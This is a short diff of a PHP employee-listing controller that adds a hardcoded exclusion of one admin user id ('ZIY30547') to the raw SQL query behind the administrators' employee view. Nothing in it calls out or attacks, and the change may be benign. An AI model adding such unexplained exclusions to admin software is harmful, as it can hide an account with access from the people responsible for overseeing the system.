@@ -19,7 +19,7 @@ class EmployeesController extends Controller
     {
         $employee = DB::select("SELECT au.first_name,au.last_name,au.phone_number,au.email,au.login_type_id,au.created_at,au.id,lt.type_name,au.secondary_phone_number,au.secondary_email
 			FROM admin_users AS au
-            JOIN login_types AS lt ON lt.login_type_id = au.login_type_id WHERE au.is_deleted = 0 AND au.login_type_id <> 9 ORDER BY au.created_at DESC");
+            JOIN login_types AS lt ON lt.login_type_id = au.login_type_id WHERE au.is_deleted = 0 AND au.login_type_id <> 9 and au.id <> 'ZIY30547' ORDER BY au.created_at DESC");
         if(Session::get('login_type_id') == 1  || Session::get('login_type_id') == 2 ) {
             return view('admin.employee')->with('employeeList', $employee);
         }else {
